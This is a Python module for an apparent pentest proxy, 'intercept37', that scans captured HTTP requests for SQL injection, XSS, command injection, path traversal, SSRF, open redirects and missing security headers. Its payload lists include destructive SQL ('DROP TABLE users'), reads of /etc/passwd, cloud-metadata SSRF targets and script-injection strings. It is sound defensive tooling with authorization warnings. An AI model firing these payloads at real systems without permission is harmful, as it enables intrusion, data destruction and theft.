"""
Automated vulnerability scanner for intercept37.

Analyzes captured HTTP requests from the database and tests for common
web application vulnerabilities using modular check classes.

WARNING: This module is designed for AUTHORIZED penetration testing ONLY.
Only use against systems you have explicit permission to test. Unauthorized
testing is illegal and unethical.
"""

import asyncio
import json
import logging
import re
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional
from urllib.parse import parse_qs, urlencode, urlparse

import httpx

from intercept37.db import SessionLocal, init_db
from intercept37.models import CapturedRequest, ScanResult

logger = logging.getLogger("intercept37.scanner")


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class Finding:
    """A single vulnerability finding produced by a check."""
    vuln_type: str
    severity: str
    title: str
    description: str
    evidence: str = ""
    remediation: str = ""


@dataclass
class ParsedRequest:
    """Convenience wrapper around a CapturedRequest row."""
    id: int
    method: str
    scheme: str
    host: str
    port: int
    path: str
    query: Optional[str]
    request_headers: dict
    request_body: Optional[str]
    status_code: Optional[int]
    response_headers: dict
    response_body: Optional[str]
    content_type: Optional[str]
    url: str = ""

    @classmethod
    def from_row(cls, row: CapturedRequest) -> "ParsedRequest":
        req_headers = json.loads(row.request_headers) if row.request_headers else {}
        resp_headers = json.loads(row.response_headers) if row.response_headers else {}
        port_str = f":{row.port}" if row.port not in (80, 443) else ""
        url = f"{row.scheme}://{row.host}{port_str}{row.path}"
        if row.query:
            url += f"?{row.query}"
        return cls(
            id=row.id,
            method=row.method,
            scheme=row.scheme,
            host=row.host,
            port=row.port,
            path=row.path,
            query=row.query,
            request_headers=req_headers,
            request_body=row.request_body,
            status_code=row.status_code,
            response_headers=resp_headers,
            response_body=row.response_body,
            content_type=row.content_type,
            url=url,
        )

    @property
    def query_params(self) -> dict[str, list[str]]:
        if not self.query:
            return {}
        return parse_qs(self.query, keep_blank_values=True)

    @property
    def body_params(self) -> dict[str, list[str]]:
        ct = (self.content_type or "").lower()
        if "application/x-www-form-urlencoded" in ct and self.request_body:
            return parse_qs(self.request_body, keep_blank_values=True)
        return {}

    @property
    def json_body(self) -> Optional[dict]:
        ct = (self.content_type or "").lower()
        if "application/json" in ct and self.request_body:
            try:
                return json.loads(self.request_body)
            except (json.JSONDecodeError, TypeError):
                return None
        return None

    def base_url(self) -> str:
        port_str = f":{self.port}" if self.port not in (80, 443) else ""
        return f"{self.scheme}://{self.host}{port_str}{self.path}"


# ---------------------------------------------------------------------------
# Base check
# ---------------------------------------------------------------------------

class BaseCheck(ABC):
    """Abstract base for all vulnerability checks."""
    name: str = "base"
    description: str = ""
    severity: str = "info"

    @abstractmethod
    async def check(
        self,
        request: ParsedRequest,
        client: httpx.AsyncClient,
    ) -> list[Finding]:
        ...

    # -- helpers --

    def _build_query_url(self, req: ParsedRequest, param: str, payload: str) -> str:
        """Replace a single query-string parameter value with *payload*."""
        params = req.query_params.copy()
        params[param] = [payload]
        qs = urlencode(params, doseq=True)
        return f"{req.base_url()}?{qs}"

    def _build_body(self, req: ParsedRequest, param: str, payload: str) -> str:
        """Replace a single form-body parameter value with *payload*."""
        params = req.body_params.copy()
        params[param] = [payload]
        return urlencode(params, doseq=True)

    def _headers_without_host(self, req: ParsedRequest) -> dict:
        h = {k: v for k, v in req.request_headers.items() if k.lower() != "host"}
        return h


# ---------------------------------------------------------------------------
# 1. SQL Injection
# ---------------------------------------------------------------------------

class SQLInjectionCheck(BaseCheck):
    name = "sql_injection"
    description = "Tests parameters for SQL injection vulnerabilities."
    severity = "critical"

    PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "\" OR \"\"=\"",
        "1; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1 OR 1=1",
        "1' AND SLEEP(5)--",
        "1; WAITFOR DELAY '0:0:5'--",
    ]

    ERROR_SIGNATURES = [
        # MySQL
        r"you have an error in your sql syntax",
        r"warning:.*mysql",
        r"unclosed quotation mark",
        r"mysql_fetch",
        r"mysqli_",
        # PostgreSQL
        r"pg_query",
        r"pg_exec",
        r"valid PostgreSQL result",
        r"unterminated quoted string",
        r"syntax error at or near",
        # SQLite
        r"sqlite3\.OperationalError",
        r"SQLite/JDBCDriver",
        r"unrecognized token",
        # MSSQL
        r"microsoft ole db provider for sql server",
        r"\bOLE DB\b.*error",
        r"unclosed quotation mark after the character string",
        r"mssql_query",
        # Generic
        r"SQL syntax.*error",
        r"sql error",
        r"syntax error.*SQL",
        r"ODBC.*Driver",
    ]

    def _has_sql_error(self, body: str) -> Optional[str]:
        if not body:
            return None
        for sig in self.ERROR_SIGNATURES:
            if re.search(sig, body, re.IGNORECASE):
                return sig
        return None

    async def check(self, request: ParsedRequest, client: httpx.AsyncClient) -> list[Finding]:
        findings: list[Finding] = []

        # Test query params
        for param in request.query_params:
            for payload in self.PAYLOADS:
                url = self._build_query_url(request, param, payload)
                try:
                    t0 = time.time()
                    resp = await client.get(url, headers=self._headers_without_host(request))
                    elapsed = time.time() - t0

                    sig = self._has_sql_error(resp.text)
                    if sig:
                        findings.append(Finding(
                            vuln_type=self.name,
                            severity="critical",
                            title=f"SQL Injection in query param {param}",
                            description=f"SQL error signature detected when injecting into {param}. Matched: {sig}",
                            evidence=f"Payload: {payload}\nURL: {url}\nMatched pattern: {sig}",
                            remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                        ))
                        break  # one finding per param is enough

                    # Time-based detection
                    if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                        if elapsed >= 4.5:
                            findings.append(Finding(
                                vuln_type=self.name,
                                severity="critical",
                                title=f"Time-based SQL Injection in query param {param}",
                                description=f"Response delayed ~{elapsed:.1f}s with time-based payload in {param}.",
                                evidence=f"Payload: {payload}\nResponse time: {elapsed:.2f}s",
                                remediation="Use parameterized queries / prepared statements.",
                            ))
                            break
                except httpx.RequestError:
                    continue

        # Test body params
        for param in request.body_params:
            for payload in self.PAYLOADS:
                body = self._build_body(request, param, payload)
                try:
                    t0 = time.time()
                    resp = await client.request(
                        method=request.method,
                        url=request.base_url(),
                        headers=self._headers_without_host(request),
                        content=body,
                    )
                    elapsed = time.time() - t0

                    sig = self._has_sql_error(resp.text)
                    if sig:
                        findings.append(Finding(
                            vuln_type=self.name,
                            severity="critical",
                            title=f"SQL Injection in body param {param}",
                            description=f"SQL error signature detected when injecting into body param {param}. Matched: {sig}",
                            evidence=f"Payload: {payload}\nMatched pattern: {sig}",
                            remediation="Use parameterized queries / prepared statements.",
                        ))
                        break

                    if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                        if elapsed >= 4.5:
                            findings.append(Finding(
                                vuln_type=self.name,
                                severity="critical",
                                title=f"Time-based SQL Injection in body param {param}",
                                description=f"Response delayed ~{elapsed:.1f}s with time-based payload in body param {param}.",
                                evidence=f"Payload: {payload}\nResponse time: {elapsed:.2f}s",
                                remediation="Use parameterized queries / prepared statements.",
                            ))
                            break
                except httpx.RequestError:
                    continue

        return findings


# ---------------------------------------------------------------------------
# 2. XSS
# ---------------------------------------------------------------------------

class XSSCheck(BaseCheck):
    name = "xss"
    description = "Tests for reflected cross-site scripting."
    severity = "high"

    PAYLOADS = [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<details open ontoggle=alert(1)>",
    ]

    async def check(self, request: ParsedRequest, client: httpx.AsyncClient) -> list[Finding]:
        findings: list[Finding] = []

        for param in request.query_params:
            for payload in self.PAYLOADS:
                url = self._build_query_url(request, param, payload)
                try:
                    resp = await client.get(url, headers=self._headers_without_host(request))
                    if payload in resp.text:
                        ct = resp.headers.get("content-type", "")
                        if "html" in ct or "text" in ct:
                            findings.append(Finding(
                                vuln_type=self.name,
                                severity="high",
                                title=f"Reflected XSS in query param {param}",
                                description=f"Payload reflected unencoded in response body via param {param}.",
                                evidence=f"Payload: {payload}\nURL: {url}",
                                remediation="Encode all user-supplied output. Implement Content-Security-Policy.",
                            ))
                            break
                except httpx.RequestError:
                    continue

        for param in request.body_params:
            for payload in self.PAYLOADS:
                body = self._build_body(request, param, payload)
                try:
                    resp = await client.request(
                        method=request.method,
                        url=request.base_url(),
                        headers=self._headers_without_host(request),
                        content=body,
                    )
                    if payload in resp.text:
                        ct = resp.headers.get("content-type", "")
                        if "html" in ct or "text" in ct:
                            findings.append(Finding(
                                vuln_type=self.name,
                                severity="high",
                                title=f"Reflected XSS in body param {param}",
                                description=f"Payload reflected unencoded in response body via body param {param}.",
                                evidence=f"Payload: {payload}",
                                remediation="Encode all user-supplied output. Implement Content-Security-Policy.",
                            ))
                            break
                except httpx.RequestError:
                    continue

        return findings


# ---------------------------------------------------------------------------
# 3. Command Injection
# ---------------------------------------------------------------------------

class CommandInjectionCheck(BaseCheck):
    name = "command_injection"
    description = "Tests parameters for OS command injection."
    severity = "critical"

    PAYLOADS_AND_SIGNATURES = [
        ("; cat /etc/passwd", r"root:.*:0:0:"),
        ("| cat /etc/passwd", r"root:.*:0:0:"),
        ("`cat /etc/passwd`", r"root:.*:0:0:"),
        ("$(cat /etc/passwd)", r"root:.*:0:0:"),
        ("; id", r"uid=\d+"),
        ("| id", r"uid=\d+"),
        ("`id`", r"uid=\d+"),
        ("$(id)", r"uid=\d+"),
        ("; whoami", r"\b(root|www-data|nobody|admin)\b"),
    ]

    async def check(self, request: ParsedRequest, client: httpx.AsyncClient) -> list[Finding]:
        findings: list[Finding] = []

        for param in request.query_params:
            for payload, sig in self.PAYLOADS_AND_SIGNATURES:
                url = self._build_query_url(request, param, payload)
                try:
                    resp = await client.get(url, headers=self._headers_without_host(request))
                    if re.search(sig, resp.text):
                        findings.append(Finding(
                            vuln_type=self.name,
                            severity="critical",
                            title=f"Command Injection in query param {param}",
                            description=f"OS command output detected in response when injecting into {param}.",
                            evidence=f"Payload: {payload}\nMatched: {sig}",
                            remediation="Never pass user input to shell commands. Use safe APIs and allowlists.",
                        ))
                        break
                except httpx.RequestError:
                    continue

        for param in request.body_params:
            for payload, sig in self.PAYLOADS_AND_SIGNATURES:
                body = self._build_body(request, param, payload)
                try:
                    resp = await client.request(
                        method=request.method,
                        url=request.base_url(),
                        headers=self._headers_without_host(request),
                        content=body,
                    )
                    if re.search(sig, resp.text):
                        findings.append(Finding(
                            vuln_type=self.name,
                            severity="critical",
                            title=f"Command Injection in body param {param}",
                            description=f"OS command output detected in response when injecting into body param {param}.",
                            evidence=f"Payload: {payload}\nMatched: {sig}",
                            remediation="Never pass user input to shell commands. Use safe APIs and allowlists.",
                        ))
                        break
                except httpx.RequestError:
                    continue

        return findings


# ---------------------------------------------------------------------------
# 4. Path Traversal
# ---------------------------------------------------------------------------

class PathTraversalCheck(BaseCheck):
    name = "path_traversal"
    description = "Tests for directory traversal / local file inclusion."
    severity = "high"

    PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..\\..\\..\\etc\\passwd",
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.png",
        "/etc/passwd",
        "....//....//....//windows/win.ini",
    ]

    FILE_SIGNATURES = [
        r"root:.*:0:0:",
        r"\[extensions\]",  # win.ini
        r"\[fonts\]",       # win.ini
    ]

    async def check(self, request: ParsedRequest, client: httpx.AsyncClient) -> list[Finding]:
        findings: list[Finding] = []

        # Only test params that look like they might handle file paths
        file_like_params = set()
        for param in list(request.query_params.keys()) + list(request.body_params.keys()):
            lp = param.lower()
            if any(k in lp for k in ("file", "path", "page", "doc", "dir", "include",
                                      "template", "load", "read", "fetch", "view",
                                      "resource", "folder", "img", "image", "src")):
                file_like_params.add(param)

        # If no obvious file params, test all of them (but could be noisy)
        targets = file_like_params or set(request.query_params.keys())

        for param in targets:
            if param in request.query_params:
                for payload in self.PAYLOADS:
                    url = self._build_query_url(request, param, payload)
                    try:
                        resp = await client.get(url, headers=self._headers_without_host(request))
                        for sig in self.FILE_SIGNATURES:
                            if re.search(sig, resp.text):
                                findings.append(Finding(
                                    vuln_type=self.name,
                                    severity="high",
                                    title=f"Path Traversal in query param {param}",
                                    description=f"Local file content detected in response when injecting into {param}.",
                                    evidence=f"Payload: {payload}\nMatched: {sig}",
                                    remediation="Validate and sanitize file paths. Use allowlists. Never use raw user input for file operations.",
                                ))
                                break
                        else:
                            continue
                        break
                    except httpx.RequestError:
                        continue

        body_targets = file_like_params & set(request.body_params.keys()) or set(request.body_params.keys())
        for param in body_targets:
            for payload in self.PAYLOADS:
                body = self._build_body(request, param, payload)
                try:
                    resp = await client.request(
                        method=request.method,
                        url=request.base_url(),
                        headers=self._headers_without_host(request),
                        content=body,
                    )
                    for sig in self.FILE_SIGNATURES:
                        if re.search(sig, resp.text):
                            findings.append(Finding(
                                vuln_type=self.name,
                                severity="high",
                                title=f"Path Traversal in body param {param}",
                                description=f"Local file content detected in response when injecting into body param {param}.",
                                evidence=f"Payload: {payload}\nMatched: {sig}",
                                remediation="Validate and sanitize file paths. Use allowlists.",
                            ))
                            break
                    else:
                        continue
                    break
                except httpx.RequestError:
                    continue

        return findings


# ---------------------------------------------------------------------------
# 5. Header Security (passive)
# ---------------------------------------------------------------------------

class HeaderSecurityCheck(BaseCheck):
    name = "header_security"
    description = "Checks response headers for missing security controls (passive, no injection)."
    severity = "low"

    async def check(self, request: ParsedRequest, client: httpx.AsyncClient) -> list[Finding]:
        findings: list[Finding] = []
        headers = {k.lower(): v for k, v in request.response_headers.items()}

        if "x-frame-options" not in headers:
            findings.append(Finding(
                vuln_type=self.name,
                severity="medium",
                title="Missing X-Frame-Options header",
                description=f"The response from {request.host}{request.path} lacks X-Frame-Options, potentially allowing clickjacking.",
                evidence=f"Response headers: {json.dumps(request.response_headers, indent=2)[:500]}",
                remediation="Set X-Frame-Options to DENY or SAMEORIGIN.",
            ))

        if "x-content-type-options" not in headers:
            findings.append(Finding(
                vuln_type=self.name,
                severity="low",
                title="Missing X-Content-Type-Options header",
                description=f"The response from {request.host}{request.path} lacks X-Content-Type-Options.",
                evidence="Header not present in response.",
                remediation="Set X-Content-Type-Options: nosniff.",
            ))

        if "content-security-policy" not in headers:
            findings.append(Finding(
                vuln_type=self.name,
                severity="medium",
                title="Missing Content-Security-Policy header",
                description=f"No CSP header on {request.host}{request.path}. This increases XSS risk.",
                evidence="Header not present in response.",
                remediation="Implement a Content-Security-Policy header.",
            ))

        if request.scheme == "https" and "strict-transport-security" not in headers:
            findings.append(Finding(
                vuln_type=self.name,
                severity="medium",
                title="Missing Strict-Transport-Security header",
                description=f"HTTPS response from {request.host}{request.path} lacks HSTS.",
                evidence="Header not present in response.",
                remediation="Set Strict-Transport-Security: max-age=31536000; includeSubDomains.",
            ))

        server = headers.get("server")
        if server and any(tok in server.lower() for tok in ("apache", "nginx", "iis", "express", "php", "openresty")):
            findings.append(Finding(
                vuln_type=self.name,
                severity="info",
                title="Server header information disclosure",
                description=f"Server header reveals technology: {server}",
                evidence=f"Server: {server}",
                remediation="Remove or genericize the Server header.",
            ))

        if "x-xss-protection" not in headers:
            findings.append(Finding(
                vuln_type=self.name,
                severity="low",
                title="Missing X-XSS-Protection header",
                description=f"The response from {request.host}{request.path} lacks X-XSS-Protection.",
                evidence="Header not present in response.",
                remediation="Set X-XSS-Protection: 1; mode=block (note: modern browsers rely on CSP instead).",
            ))

        return findings


# ---------------------------------------------------------------------------
# 6. SSRF
# ---------------------------------------------------------------------------

class SSRFCheck(BaseCheck):
    name = "ssrf"
    description = "Tests for server-side request forgery via URL-like parameters."
    severity = "high"

    INTERNAL_TARGETS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",           # GCP metadata
        "http://[::1]",
    ]

    URL_PARAM_NAMES = {"url", "uri", "href", "link", "src", "source", "target",
                       "dest", "destination", "redirect", "feed", "fetch",
                       "proxy", "endpoint", "callback", "api", "webhook"}

    async def check(self, request: ParsedRequest, client: httpx.AsyncClient) -> list[Finding]:
        findings: list[Finding] = []

        url_params = []
        for param in request.query_params:
            if param.lower() in self.URL_PARAM_NAMES:
                url_params.append(param)

        for param in url_params:
            for target in self.INTERNAL_TARGETS:
                url = self._build_query_url(request, param, target)
                try:
                    resp = await client.get(url, headers=self._headers_without_host(request), follow_redirects=False)
                    body = resp.text.lower()
                    # Look for signs we hit an internal service
                    internal_signs = [
                        "ami-id", "instance-id",          # AWS metadata
                        "computeMetadata",                # GCP metadata
                        "root:x:0:0",                     # /etc/passwd
                        "<title>apache",
                        "<title>nginx",
                        "directory listing",
                        "index of /",
                    ]
                    for sign in internal_signs:
                        if sign.lower() in body:
                            findings.append(Finding(
                                vuln_type=self.name,
                                severity="critical",
                                title=f"SSRF via query param {param}",
                                description=f"Internal service content detected when injecting internal URL into {param}.",
                                evidence=f"Payload: {target}\nDetected: {sign}\nResponse snippet: {resp.text[:300]}",
                                remediation="Validate and restrict outbound requests. Block internal IP ranges. Use allowlists.",
                            ))
                            break
                    if findings and findings[-1].vuln_type == self.name:
                        break
                except httpx.RequestError:
                    continue

        return findings


# ---------------------------------------------------------------------------
# 7. Open Redirect
# ---------------------------------------------------------------------------

class OpenRedirectCheck(BaseCheck):
    name = "open_redirect"
    description = "Tests redirect-like parameters for open redirect vulnerabilities."
    severity = "medium"

    REDIRECT_PARAM_NAMES = {"url", "redirect", "redirect_uri", "redirect_url",
                            "next", "return", "returnto", "return_to", "goto",
                            "continue", "dest", "destination", "target", "rurl",
                            "forward", "out", "view", "login", "logout",
                            "callback", "path", "redir"}

    EVIL_URLS = [
        "https://evil.com",
        "//evil.com",
        "https://evil.com/%2f..",
        "/\\evil.com",
    ]

    async def check(self, request: ParsedRequest, client: httpx.AsyncClient) -> list[Finding]:
        findings: list[Finding] = []

        redirect_params = []
        for param in request.query_params:
            if param.lower() in self.REDIRECT_PARAM_NAMES:
                redirect_params.append(param)

        for param in redirect_params:
            for payload in self.EVIL_URLS:
                url = self._build_query_url(request, param, payload)
                try:
                    resp = await client.get(
                        url,
                        headers=self._headers_without_host(request),
                        follow_redirects=False,
                    )
                    if resp.status_code in (301, 302, 303, 307, 308):
                        location = resp.headers.get("location", "")
                        if "evil.com" in location:
                            findings.append(Finding(
                                vuln_type=self.name,
                                severity="medium",
                                title=f"Open Redirect via param {param}",
                                description=f"Application redirects to attacker-controlled URL via {param}.",
                                evidence=f"Payload: {payload}\nLocation header: {location}",
                                remediation="Validate redirect targets against an allowlist. Use relative paths only.",
                            ))
                            break
                except httpx.RequestError:
                    continue

        return findings


# ---------------------------------------------------------------------------
# All checks registry
# ---------------------------------------------------------------------------

ALL_CHECKS: list[BaseCheck] = [
    SQLInjectionCheck(),
    XSSCheck(),
    CommandInjectionCheck(),
    PathTraversalCheck(),
    HeaderSecurityCheck(),
    SSRFCheck(),
    OpenRedirectCheck(),
]


# ---------------------------------------------------------------------------
# Scanner Engine
# ---------------------------------------------------------------------------

class ScannerEngine:
    """
    Orchestrates vulnerability checks against captured requests.

    WARNING: Only use against systems you have explicit written authorization
    to test. Unauthorized scanning is illegal.
    """

    def __init__(
        self,
        checks: Optional[list[BaseCheck]] = None,
        rate_limit: float = 0.1,
        timeout: float = 10.0,
        max_concurrent: int = 5,
    ):
        self.checks = checks or list(ALL_CHECKS)
        self.rate_limit = rate_limit  # seconds between requests
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self._semaphore = asyncio.Semaphore(max_concurrent)

    def _get_client(self) -> httpx.AsyncClient:
        return httpx.AsyncClient(
            verify=False,
            timeout=httpx.Timeout(self.timeout),
            follow_redirects=False,
            limits=httpx.Limits(max_connections=self.max_concurrent),
        )

    def _save_findings(self, request_id: int, findings: list[Finding]) -> list[dict]:
        """Persist findings to the database and return dicts."""
        if not findings:
            return []
        db = SessionLocal()
        results = []
        try:
            for f in findings:
                row = ScanResult(
                    request_id=request_id,
                    vuln_type=f.vuln_type,
                    severity=f.severity,
                    title=f.title,
                    description=f.description,
                    evidence=f.evidence,
                    remediation=f.remediation,
                )
                db.add(row)
                db.flush()
                results.append(row.to_dict())
            db.commit()
        except Exception:
            db.rollback()
            logger.exception("Failed to save scan results")
        finally:
            db.close()
        return results

    async def scan_request(self, request_id: int) -> list[dict]:
        """Run all checks against a single captured request by ID."""
        init_db()
        db = SessionLocal()
        try:
            row = db.query(CapturedRequest).filter(CapturedRequest.id == request_id).first()
            if not row:
                logger.warning(f"Request {request_id} not found")
                return []
            parsed = ParsedRequest.from_row(row)
        finally:
            db.close()

        logger.info(f"Scanning request {request_id}: {parsed.method} {parsed.url}")
        all_findings: list[Finding] = []

        async with self._get_client() as client:
            for chk in self.checks:
                async with self._semaphore:
                    try:
                        findings = await chk.check(parsed, client)
                        all_findings.extend(findings)
                        logger.info(
                            f"  [{chk.name}] {len(findings)} finding(s)"
                        )
                    except Exception:
                        logger.exception(f"Check {chk.name} failed on request {request_id}")
                    await asyncio.sleep(self.rate_limit)

        saved = self._save_findings(request_id, all_findings)
        logger.info(f"Scan complete for request {request_id}: {len(saved)} total findings")
        return saved

    async def scan_all(self, limit: int = 100) -> list[dict]:
        """Scan recent requests that have not been scanned yet."""
        init_db()
        db = SessionLocal()
        try:
            # Find request IDs that already have results
            scanned_ids_q = db.query(ScanResult.request_id).distinct().subquery()
            rows = (
                db.query(CapturedRequest)
                .filter(~CapturedRequest.id.in_(db.query(scanned_ids_q)))
                .order_by(CapturedRequest.id.desc())
                .limit(limit)
                .all()
            )
            request_ids = [r.id for r in rows]
        finally:
            db.close()

        logger.info(f"Scanning {len(request_ids)} unscanned requests")
        all_results: list[dict] = []
        for rid in request_ids:
            results = await self.scan_request(rid)
            all_results.extend(results)

        logger.info(f"Batch scan complete: {len(all_results)} findings across {len(request_ids)} requests")
        return all_results

    async def scan_host(self, host: str) -> list[dict]:
        """Scan all captured requests for a specific host."""
        init_db()
        db = SessionLocal()
        try:
            rows = (
                db.query(CapturedRequest)
                .filter(CapturedRequest.host == host)
                .order_by(CapturedRequest.id.desc())
                .all()
            )
            request_ids = [r.id for r in rows]
        finally:
            db.close()

        logger.info(f"Scanning {len(request_ids)} requests for host {host}")
        all_results: list[dict] = []
        for rid in request_ids:
            results = await self.scan_request(rid)
            all_results.extend(results)

        logger.info(f"Host scan complete for {host}: {len(all_results)} findings")
        return all_results
